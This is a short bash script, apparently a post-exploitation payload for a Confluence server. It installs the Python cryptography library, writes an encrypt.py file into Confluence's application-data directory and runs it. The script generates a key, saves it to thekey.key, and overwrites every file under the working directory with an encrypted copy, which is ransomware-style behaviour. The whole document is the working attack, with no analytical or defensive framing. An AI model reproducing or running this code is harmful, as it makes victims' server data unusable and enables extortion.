#!/bin/bash
sudo apt update
sudo apt install python3-pip -y
sudo pip3 install cryptography
cat > /var/atlassian/application-data/confluence/encrypt.py <<EOF
#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

files = []
key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
for root, dirs, files in os.walk(os.getcwd()):
    for file in files:
        if "encrypt.py" in file or file == "thekey.key":
            continue
        else:
            with open(os.path.join(root,file), "rb") as thefile:
                contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
            with open(os.path.join(root,file), "wb") as thefile:
                thefile.write(contents_encrypted)
EOF

python3 encrypt.py

